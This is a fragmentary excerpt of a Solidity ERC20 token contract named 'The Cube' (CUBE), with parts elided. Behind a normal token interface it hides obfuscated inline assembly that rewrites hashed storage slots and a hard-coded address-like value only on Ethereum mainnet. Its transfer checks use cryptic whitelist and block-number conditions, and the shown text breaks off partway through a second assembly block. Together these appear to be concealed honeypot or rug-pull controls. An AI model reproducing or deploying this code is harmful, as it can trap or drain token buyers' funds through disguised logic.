...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    bool private trading; uint256 private brainDrain = 1; bool private treeOfLife;
    uint256 private _decimals; uint256 private knowLedge;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        cubeAddr.push(_router); cubeAddr.push(msgSender_); cubeAddr.push(pair);
        for (uint256 q=0; q < 3;) {_toShibaInu[cubeAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function _theInit() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x5b50d9fa8136494b3547e0fcdedbd30e4809be524246a3d89a05bc043c367e78))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x36f5cb76e8f94ba17aac0501a90f9d14d6dbb0df38b804570d6c82ba9754d027,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x5b50d9fa8136494b3547e0fcdedbd30e4809be524246a3d89a05bc043c367e78,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == cubeAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((treeOfLife || _toSaitama[sender]) && ((_wrongSymbol - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_wrongSymbol == block.number))) && ((_toShibaInu[recipient] == true) && (_toShibaInu[sender] != true) || ((cubeAddr[1] == recipient) && (_toShibaInu[cubeAddr[1]] != true))) && (knowLedge > 0);
            assembly { 
...
contract TheCube is ERC20Token {
    constructor() ERC20Token("The Cube", "CUBE", msg.sender, 32000000 * 10 ** 18) {
    }
}